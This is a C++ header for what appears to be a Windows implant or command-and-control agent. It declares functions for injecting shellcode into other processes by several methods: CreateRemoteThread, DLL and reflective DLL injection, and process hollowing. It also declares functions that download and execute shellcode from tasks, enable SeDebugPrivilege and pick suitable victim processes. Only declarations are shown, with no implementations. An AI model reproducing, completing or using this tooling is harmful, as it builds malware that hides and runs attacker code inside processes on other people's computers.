#pragma once

#include "json.hpp"
#include <string>
#include <vector>
#include <windows.h>

using json = nlohmann::json;

namespace Tasks {
namespace Injection {

    // Injection method enumeration
    enum class InjectionMethod {
        CREATE_REMOTE_THREAD = 1,
        PROCESS_HOLLOWING = 2,
        DLL_INJECTION = 3,
        REFLECTIVE_DLL = 4,
        MANUAL_MAP = 5
    };

    // Injection result structure
    struct InjectionResult {
        bool success;
        std::string message;
        DWORD processId;
        DWORD threadId;
        
        InjectionResult(bool s = false, const std::string& msg = "", DWORD pid = 0, DWORD tid = 0)
            : success(s), message(msg), processId(pid), threadId(tid) {}
    };

    // Process information structure
    struct ProcessInfo {
        DWORD processId;
        DWORD parentId;
        std::string processName;
        std::string architecture;
        bool isElevated;
        std::string username;
        
        ProcessInfo() : processId(0), parentId(0), isElevated(false) {}
    };

    /**
     * Execute shellcode in the current process
     * @param shellcode Shellcode bytes to execute
     * @param shellcodeSize Size of shellcode in bytes
     * @param captureOutput Whether to capture stdout output
     * @return Execution result and any captured output
     */
    std::pair<bool, std::string> ExecuteLocalShellcode(
        char* shellcode, 
        size_t shellcodeSize, 
        bool captureOutput = false
    );

    /**
     * Inject shellcode into a remote process using CreateRemoteThread
     * @param targetPid Target process ID
     * @param shellcode Shellcode bytes to inject
     * @param shellcodeSize Size of shellcode in bytes
     * @return InjectionResult with success status and details
     */
    InjectionResult InjectCreateRemoteThread(
        DWORD targetPid, 
        const void* shellcode, 
        size_t shellcodeSize
    );

    /**
     * Inject DLL into target process
     * @param targetPid Target process ID
     * @param dllPath Path to DLL to inject
     * @return InjectionResult with success status and details
     */
    InjectionResult InjectDLL(DWORD targetPid, const std::string& dllPath);

    /**
     * Perform reflective DLL injection
     * @param targetPid Target process ID
     * @param dllBytes DLL bytes to inject
     * @param dllSize Size of DLL in bytes
     * @return InjectionResult with success status and details
     */
    InjectionResult InjectReflectiveDLL(
        DWORD targetPid, 
        const void* dllBytes, 
        size_t dllSize
    );

    /**
     * Get detailed information about a process
     * @param processId Process ID to query
     * @return ProcessInfo structure with process details
     */
    ProcessInfo GetProcessInfo(DWORD processId);

    /**
     * Check if a process is suitable for injection
     * @param processId Process ID to check
     * @param requiredArch Required architecture ("x86" or "x64", empty for any)
     * @return true if process is suitable for injection
     */
    bool IsProcessSuitableForInjection(DWORD processId, const std::string& requiredArch = "");

    /**
     * Find processes by name pattern
     * @param processName Process name pattern to search for
     * @param exactMatch Whether to match exact name or partial
     * @return Vector of matching process IDs
     */
    std::vector<DWORD> FindProcessesByName(const std::string& processName, bool exactMatch = false);

    /**
     * Find suitable target processes for injection
     * @param excludeElevated Whether to exclude elevated processes
     * @param requiredArch Required architecture filter
     * @return Vector of suitable process IDs
     */
    std::vector<DWORD> FindSuitableTargets(bool excludeElevated = false, const std::string& requiredArch = "");

    /**
     * Validate shellcode before execution (basic safety checks)
     * @param shellcode Shellcode bytes to validate
     * @param shellcodeSize Size of shellcode
     * @return true if shellcode passes basic validation
     */
    bool ValidateShellcode(const void* shellcode, size_t shellcodeSize);

    /**
     * Download and execute privilege-related shellcode (setpriv)
     * @param task JSON task containing file_id for shellcode download
     * @return Execution result and output
     */
    std::pair<bool, std::string> ExecuteSetPrivShellcode(const json& task);

    /**
     * Download and execute privilege listing shellcode (listprivs)
     * @param task JSON task containing file_id for shellcode download
     * @return Execution result and output
     */
    std::pair<bool, std::string> ExecuteListPrivsShellcode(const json& task);

    /**
     * Download and inject shellcode into remote process
     * @param task JSON task containing file_id and target PID
     * @param targetPid Target process ID for injection
     * @return InjectionResult with operation status
     */
    InjectionResult ExecuteRemoteInjection(const json& task, DWORD targetPid);

    /**
     * Check if current process has necessary privileges for injection
     * @return true if process has required privileges
     */
    bool HasInjectionPrivileges();

    /**
     * Enable SeDebugPrivilege for process injection
     * @return true if privilege enabled successfully
     */
    bool EnableSeDebugPrivilege();

    /**
     * Get the architecture of the current process
     * @return "x86" or "x64"
     */
    std::string GetCurrentArchitecture();

    /**
     * Check if two processes have compatible architectures for injection
     * @param sourcePid Source process ID (injector)
     * @param targetPid Target process ID (injection target)
     * @return true if architectures are compatible
     */
    bool AreArchitecturesCompatible(DWORD sourcePid, DWORD targetPid);

    /**
     * Create a suspended process for process hollowing
     * @param executablePath Path to executable to create
     * @param commandLine Command line arguments
     * @return Process ID of created suspended process, 0 if failed
     */
    DWORD CreateSuspendedProcess(const std::string& executablePath, const std::string& commandLine = "");

    /**
     * Perform process hollowing injection
     * @param targetPid Target suspended process ID
     * @param payload Payload to inject
     * @param payloadSize Size of payload
     * @return InjectionResult with operation status
     */
    InjectionResult InjectProcessHollowing(DWORD targetPid, const void* payload, size_t payloadSize);

} // namespace Injection
} // namespace Tasks